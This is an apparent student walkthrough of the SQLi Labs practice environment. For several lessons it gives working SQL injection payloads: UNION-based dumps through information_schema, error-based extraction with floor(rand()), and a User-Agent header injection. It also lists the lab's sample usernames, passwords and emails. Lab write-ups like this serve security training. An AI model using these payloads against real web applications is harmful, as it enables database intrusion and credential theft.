__SQLI LABS__
==========
First we have to setup the lab:

* install apache2 webserver by ```>sudo apt install apache2```
* install mysql by ```>sudo apt-get install mysql-srver```
* install php7
* git clone the repository of the lab and start all the service required

#OBJECTIVE
==========
_dump the contents of the databse using sqli_
 
##LESS-1
========
* first we have to pass the ```?id=``` parameter and pass a numeric value
* fuzz the parameter to get sqli
* when we put ```'``` we get sql error thus we have a sql injection we can comment ou the rest of the query by ```-- -```or ```--+``` or any comments in sql
* then we can dump the contents

 ##payloads to dump
---------------------
check no: of table included 	=```/?id=1'order by 1,2,3,4--+"```

to find the name of data base	= ```/id=-1' union select 1,database(),3--+```
to find table name 	    	= ```/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+```

to find the column name	    	=```/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+```

to find the data 	    	=``` /?id=-1' union select 1,group_concat(username),group_concat(password) from users```

contents of database
--------------------
* name of database=security
* tables		=emails,referers,uagents,users
* columns		=CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,USER,id,password,username
* usernames	=Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
* password	=Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4  

##LESS-2
========
* when we fuzz the id parameter this time single qot(') i.e ``` ?id=1' ```does not work
* when we put a ```'``` before and after the 1 it worked i.e ```?id='1'```
* we can now comment ```--+``` rest and dump teh database using the same payloads (change 1' => '1') from lesson 1

#PAYLOAD EXAMPLE
=================

to find the data 	    	=``` /?id='-1' union select 1,group_concat(id),group_concat(email) from emails```

contents of database
--------------------
* name of database=security
* tables          =emails,referers,uagents,users
* columns in email=email_id,id
* id	            	=1,2,3,4,5,6,7,8
* email=Dumb@dhakkan.com,Angel@iloveu.com,Dummy@dhakkan.local,secure@dhakkan.local,stupid@dhakkan.local,superman@dhakkan.local,batman@dhakkan.local,admin@dhakkan.com 


##LESS-3
========
* in this lesson when we fuzz the id parameter we can find ``` ') ```  is used to take our input so we can use ``` ') ```  as payload
* then comment it and do the same payload form less-1

##PAYLOAD EXAMPLE
=================

to find the data 	    	=``` /?id=-1') union select 1,group_concat(username),3 from users```

contents of database
--------------------
name of database=security
tables          =emails,referers,uagents,users
columns in uagents=id,ip_address,uagent,username

LESS-4
======
* in this challenge we have to use ' ") ' as payload
* we can use 'and' or 'or' to complete the query insted of commenting

##PAYLOAD EXAMPLE
=================

to find the data 	    	=``` /?id=-1") union select 1,group_concat(username),group_concat(password) from users```

contents of database
--------------------
* name of database=security
* tables		=emails,referers,uagents,users
* columns in referer=id,ip_address,referer


LESS-5
======
* In this challenge we don't  get any response form the databse directy to the browser
* but we get the error when we break the query,so we can dump the database through the error
* we can use rand(),floor(),count() to get error


payloads
---------
this will get database  =```/?id=1' AND (select 1 from(select count(*),concat((select database()),floor(rand()*2))a from information_schema.tables group by a)b)--+```

to get table names      =```/?id=1' AND (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand()*2))a from information_schema.tables group by a)b)--+```

to get columns          =```/?id=1' AND (select 1 from(select count(*),concat((select column_name from information_schema.columns where table_name='emails' limit 0,1),floor(rand()*2))a from information_schema.tables group by a)b)--+```

contents of database
--------------------
* databse=security
* tables=emails
* columns=id

less-18
========

this is a header based injection and you can inject query in the user agent feild in the request (you need an intercepting proxy like burp or zap proxy for that)

payload
-------

* to get the data base we can use this payload
```mysql
' and (select 1 from(select count(*),concat((select database()),floor(rand()*2))a from information_schema.tables group by a)b) and '1'='1
``
